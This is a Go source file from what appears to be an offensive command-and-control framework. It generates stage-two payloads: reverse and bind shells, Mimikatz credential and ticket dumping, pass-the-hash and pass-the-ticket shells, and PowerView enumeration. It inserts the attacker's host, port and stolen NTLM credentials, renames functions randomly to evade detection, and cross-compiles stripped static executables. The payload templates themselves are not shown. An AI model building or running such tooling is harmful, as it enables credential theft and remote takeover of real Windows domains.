package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type StageTwoPayloadGeneratorModule struct {
	host           string
	port           string
	payloadType    string
	platform       string
	arch           string
	executableName string

	// pth params
	user   string
	domain string
	ntlm   string

	// ptt params
	ticketFilename string

	logger util.Logger
}

func NewStageTwoPayloadGeneratorModule(hostOpt string, portOpt string, payloadTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *StageTwoPayloadGeneratorModule {
	stpgm := StageTwoPayloadGeneratorModule{
		host:        hostOpt,
		port:        portOpt,
		payloadType: payloadTypeOpt,
		platform:    platformOpt,
		arch:        archOpt,
	}
	stpgm.logger = util.StageTwoPayloadGeneratorLogger(true, "")
	if executableNameOpt == "revshell.exe" {
		stpgm.executableName = "data/c2/helpers/" + executableNameOpt
	} else {
		stpgm.executableName = "data/c2/payloads/" + executableNameOpt
	}
	return &stpgm
}

func (stpgm *StageTwoPayloadGeneratorModule) Run() {
	payloadSource, err := stpgm.preparePayloadSource()
	if err != nil {
		stpgm.logger.Log.Error(err)
	}
	stpgm.logger.Log.Noticef("Your payload was generated in file %s:", stpgm.payloadType+".exe")
	stpgm.logger.Log.Noticef("See the source code below:\n%s", payloadSource)
	err = stpgm.compilePayload(payloadSource)
	if err != nil {
		stpgm.logger.Log.Error(err)
	}
}

func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(stpgm.payloadType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	payloadSource = strings.Replace(payloadSource, "HOST", stpgm.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", stpgm.port, -1)
	var funcPatterns []string
	if stpgm.payloadType == "mimikatz_hashdump" || stpgm.payloadType == "mimikatz_ticketdump" {
		funcPatterns = []string{
			"RUNMIMIKATZ",
			"GETHELPER",
			"MIMIKATZFILENAME",
			"WRITETOFILE",
		}
	}
	if stpgm.payloadType == "reverse_shell" || stpgm.payloadType == "bind_shell" {
		funcPatterns = []string{
			"WRITETOFILE",
			"SHELL",
			"FILENAME",
		}
	}
	if stpgm.payloadType == "mimikatz_pth_reverse_shell" {
		funcPatterns = []string{
			"GETHELPER",
			"WRITETOFILE",
			"RUNMIMIKATZ",
			"MIMIKATZFILENAME",
			"REVERSESHELLNAME",
		}
		payloadSource = strings.Replace(payloadSource, "USER", stpgm.user, -1)
		payloadSource = strings.Replace(payloadSource, "DOMAIN", stpgm.domain, -1)
		payloadSource = strings.Replace(payloadSource, "NTLM", stpgm.ntlm, -1)
	}
	if stpgm.payloadType == "mimikatz_ptt_reverse_shell" {
		funcPatterns = []string{
			"GETHELPER",
			"WRITETOFILE",
			"RUNMIMIKATZ",
			"MIMIKATZFILENAME",
			"REVERSESHELLNAME",
		}
		payloadSource = strings.Replace(payloadSource, "TICKETFILENAME", stpgm.ticketFilename, -1)
	}
	if stpgm.payloadType == "powerview_enum" || stpgm.payloadType == "powerview_enumusers" {
		funcPatterns = []string{
			"GETHELPER",
			"WRITETOFILE",
			"READFILE",
			"RUNPOWERVIEW",
			"POWERVIEWFILENAME",
			"SCRIPTFILENAME",
		}
	}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	return payloadSource, nil
}

func (stpgm *StageTwoPayloadGeneratorModule) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", stpgm.platform),
		fmt.Sprintf("GOARCH=%s", stpgm.arch),
		"go",
		"build",
		"-o",
		stpgm.executableName,
		"-ldflags",
		"-w -s -extldflags=-static",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}

func (stpgm *StageTwoPayloadGeneratorModule) SetPthParams(user, domain, ntlm string) {
	stpgm.user = user
	stpgm.domain = domain
	stpgm.ntlm = ntlm
}

func (stpgm *StageTwoPayloadGeneratorModule) SetPttParams(ticketFilename string) {
	stpgm.ticketFilename = ticketFilename
}
